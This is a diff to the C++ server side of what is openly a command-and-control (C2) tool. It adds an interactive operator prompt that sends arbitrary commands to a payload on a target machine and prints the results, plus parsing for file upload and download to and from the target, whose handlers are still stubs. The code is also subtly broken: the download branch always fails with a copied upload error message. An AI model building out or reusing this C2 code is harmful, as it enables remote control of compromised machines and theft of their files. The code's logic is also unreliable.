@@ -105,14 +105,50 @@ void C2Server::handleConnection()
     }
 
     // main loop for communication
+    std::string input;
     while (true)
     {
-        // test communication
-        auto msg = "helloWorld";
-        std::cout << "[+] Sending message to payload: " << msg << std::endl;
-        sendMsg(msg);
-        std::cout << "[+] Got response from payload: " << rcvMsg() << std::endl;
-        break;
+        // request input
+        std::cout << "[+] CMD > ";
+        getline(std::cin, input);
+
+        // and take corresponding actions
+        // depending on the command
+        if (input == "quit")
+        {
+            sendMsg(input);
+            std::cout << "[+] Quitting communication to payload due to user cmd.\n";
+            break;
+        }
+        else if (startsWith(input, "upload"))
+        {
+            auto tokens = tokenize(input);
+            if (tokens.size() != 3)
+            {
+                std::cerr << "[-] Incorrect upload syntax.\n";
+                continue;
+            }
+            sendMsg(input);
+            handleUpload(tokens[1], tokens[2]);
+        }
+        else if (startsWith(input, "download"))
+        {
+            auto tokens = tokenize(input);
+            {
+                std::cerr << "[-] Incorrect upload syntax.\n";
+                continue;
+            }
+            sendMsg(input);
+            handleDownload(tokens[1], tokens[2]);
+        }
+        else
+        {
+            // send cmd to client
+            sendMsg(input);
+
+            // and get command output from payload
+            std::cout << "[+] Got response from payload:\n" << rcvMsg() << std::endl;
+        }
     }
 }
 
@@ -200,4 +236,20 @@ std::string C2Server::rcvMsg()
         std::cerr << "[-] Error while reading from channel\n";
     }
     return std::string(buffer);
+}
+
+void C2Server::handleUpload(std::string& localFilePath, std::string& remoteFilePath)
+{
+    std::cout << "[+] Starting upload from target machine (" << localFilePath
+              << ") and saving as (" << remoteFilePath << ")\n";
+
+    // TODO
+}
+
+void C2Server::handleDownload(std::string& remoteFilePath, std::string& localFilePath)
+{
+    std::cout << "[+] Starting download of (" << localFilePath
+              << ") and saving as (" << remoteFilePath << ") on the target machine.\n";
+
+    // TODO
 }
